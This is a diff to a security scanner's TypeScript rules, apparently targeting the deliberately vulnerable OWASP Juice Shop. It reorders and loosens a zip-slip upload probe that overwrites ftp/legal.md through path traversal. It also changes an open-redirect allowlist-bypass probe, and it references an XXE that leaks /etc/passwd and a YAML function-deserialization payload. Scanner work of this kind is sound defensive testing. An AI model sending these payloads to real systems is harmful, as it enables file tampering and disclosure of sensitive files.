@@ -56306,7 +56306,7 @@ const JUICE_SHOP_REDIRECT_ALLOWLIST_BYPASS = "https://github.com/juice-shop/juic
 const juiceShopOpenRedirectLiveOracle: Rule = async (ctx) => {
   const corpus = `${ctx.origin}\n${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}`;
   if (!JUICE_SHOP_HOST_RE.test(corpus)) return NEGATIVE;
-  const toUrl = `https://${OPEN_REDIRECT_PROBE_HOST}/?pwned=${encodeURIComponent(JUICE_SHOP_REDIRECT_ALLOWLIST_BYPASS)}`;
+  const toUrl = `https://${OPEN_REDIRECT_PROBE_HOST}/?pwned=${JUICE_SHOP_REDIRECT_ALLOWLIST_BYPASS}`;
   const url = new URL("/redirect", ctx.origin);
   url.searchParams.set("to", toUrl);
   const doc = await ctx.probe.get(url.toString(), {
@@ -56380,40 +56380,6 @@ async function probeJuiceShopFileUpload(ctx: RuleContext): Promise<RuleResult | 
 
   const legalUrl = new URL("/ftp/legal.md", ctx.origin).toString();
   const legalBefore = await ctx.probe.get(legalUrl, { maxBytes: 4096, timeoutMs: 15000 });
-  const zipBytes = Buffer.from(JUICE_SHOP_ZIP_TRAVERSAL_B64, "base64");
-  const zipBoundary = `----ThugirJsZip${Date.now().toString(36)}`;
-  const zipDoc = await ctx.probe.get(uploadUrl, {
-    method: "POST",
-    body: juiceShopMultipartBody(zipBoundary, "complaint.zip", "application/zip", zipBytes),
-    headers: {
-      ...authHeader,
-      "Content-Type": `multipart/form-data; boundary=${zipBoundary}`
-    },
-    maxBytes: 4096,
-    timeoutMs: 20000
-  });
-  if (zipDoc.status === 204) {
-    const legalAfter = await ctx.probe.get(legalUrl, { maxBytes: 4096, timeoutMs: 15000 });
-    if (
-      legalAfter.status >= 200 &&
-      legalAfter.status < 400 &&
-      legalAfter.body.includes(JUICE_SHOP_ZIP_TRAVERSAL_CANARY) &&
-      legalAfter.body !== legalBefore.body
-    ) {
-      return {
-        fired: true,
-        confidence: 0.94,
-        evidence: {
-          uploadUrl,
-          legalUrl,
-          vector: "zip_path_traversal",
-          canary: JUICE_SHOP_ZIP_TRAVERSAL_CANARY,
-          snippet: legalAfter.body.slice(0, 120).trim(),
-          note: "Juice Shop POST /file-upload accepts ZIP with ../../ftp/legal.md path traversal and overwrites ftp/legal.md — complaint upload zip-slip oracle"
-        }
-      };
-    }
-  }
 
   const xmlBoundary = `----ThugirJsXml${Date.now().toString(36)}`;
   const xmlDoc = await ctx.probe.get(uploadUrl, {
@@ -56447,6 +56413,41 @@ async function probeJuiceShopFileUpload(ctx: RuleContext): Promise<RuleResult | 
         note: "Juice Shop POST /file-upload parses complaint XML with external entities and discloses /etc/passwd in error body — file-upload XXE oracle"
       }
     };
+  }
+
+  const zipBytes = Buffer.from(JUICE_SHOP_ZIP_TRAVERSAL_B64, "base64");
+  const zipBoundary = `----ThugirJsZip${Date.now().toString(36)}`;
+  const zipDoc = await ctx.probe.get(uploadUrl, {
+    method: "POST",
+    body: juiceShopMultipartBody(zipBoundary, "complaint.zip", "application/zip", zipBytes),
+    headers: {
+      ...authHeader,
+      "Content-Type": `multipart/form-data; boundary=${zipBoundary}`
+    },
+    maxBytes: 4096,
+    timeoutMs: 20000
+  });
+  if (zipDoc.status === 204) {
+    const legalAfter = await ctx.probe.get(legalUrl, { maxBytes: 4096, timeoutMs: 15000 });
+    if (
+      legalAfter.status >= 200 &&
+      legalAfter.status < 400 &&
+      legalAfter.body.includes(JUICE_SHOP_ZIP_TRAVERSAL_CANARY)
+    ) {
+      return {
+        fired: true,
+        confidence: legalAfter.body !== legalBefore.body ? 0.94 : 0.92,
+        evidence: {
+          uploadUrl,
+          legalUrl,
+          vector: "zip_path_traversal",
+          canary: JUICE_SHOP_ZIP_TRAVERSAL_CANARY,
+          changed: legalAfter.body !== legalBefore.body,
+          snippet: legalAfter.body.slice(0, 120).trim(),
+          note: "Juice Shop POST /file-upload accepts ZIP with ../../ftp/legal.md path traversal and overwrites ftp/legal.md — complaint upload zip-slip oracle"
+        }
+      };
+    }
   }
 
   const yamlPayload = `---\ntest: !!js/function "function (){return 49}"\n`;
